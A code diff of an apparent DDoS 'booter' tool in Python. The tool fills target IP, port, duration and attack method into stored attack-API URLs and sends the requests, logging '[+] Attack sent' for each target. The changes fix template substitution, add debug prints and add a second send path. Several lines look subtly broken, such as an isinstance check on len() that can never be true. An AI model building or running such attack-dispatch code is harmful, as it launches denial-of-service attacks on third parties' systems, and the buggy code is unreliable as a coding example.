@@ -70,10 +70,9 @@ class APICrud:
                 if api.startswith("api_Methods="):
                     apiiName = apis[i-3].replace("api_Name=", "")
                     apiURL = apis[i-2].replace("api_URL=", "")
-                    # print(f"{api} {apiiName} | {apiURL}\r\n")
+                    print(f"{api} {apiiName} | {apiURL}\r\n")
                     if f"|{method}" in api or f"{method}|" in api:
-                        # print("here")
-                        ListOfAPIs.append([apiiName, apiURL])
+                        ListOfAPIs += [apiiName, apiURL]
         return ListOfAPIs   
                   
     """
@@ -128,7 +127,7 @@ class APICrud:
         for api in apis:
             i += 1
             if len(api) > 5:
-                if api.startswith(f"api_Name={apiiName}"):
+                if api.startswith(f"api_Name={apiName}"):
                     apiiName = api.replace("api_Name=", "")
                     apiURL = apis[i].replace("api_URL=", "")
                     apiMethods = apis[i+1].replace("api_Methods=", "")
@@ -156,15 +155,26 @@ class APIFunc:
         if isinstance(len(APIs), list):
             for u in APIs:
                 u[1] = u[1].replace("{ip}", f"{ip}")
+                u[1] = u[1].replace("{host}", f"{ip}")
                 u[1] = u[1].replace("{port}", f"{port}")
                 u[1] = u[1].replace("{time}", f"{time}")
-                u[1] = u[1].replace("{method}", APICrud.fixFunneledMethods(method))
-                output = requests.get(f"{u}")
+                lol = APICrud.fixFunneledMethods(u[0], method)
+                u[1] = u[1].replace("{method}", lol)
+                print(f"Line 165 {u}")
+                output = requests.get(f"{u[1]}").text
                 print(output) ## debug
                 Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {u[0]}\r\n"
         else:
-            output = requests.get(f"{APIs}")
+            APIs[1] = APIs[1].replace("{ip}", f"{ip}")
+            APIs[1] = APIs[1].replace("{host}", f"{ip}")
+            APIs[1] = APIs[1].replace("{port}", f"{port}")
+            APIs[1] = APIs[1].replace("{time}", f"{time}")
+            lol = APICrud.fixFunneledMethods(APIs[0], method)
+            APIs[1] = APIs[1].replace("{method}", lol)
+            print(f"Line 174: {APIs[1]}")
+            output = requests.get(f"{APIs[1]}").text
             print(output) ## debug
+            Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {APIs[0]}\r\n"
 
         return Response
 
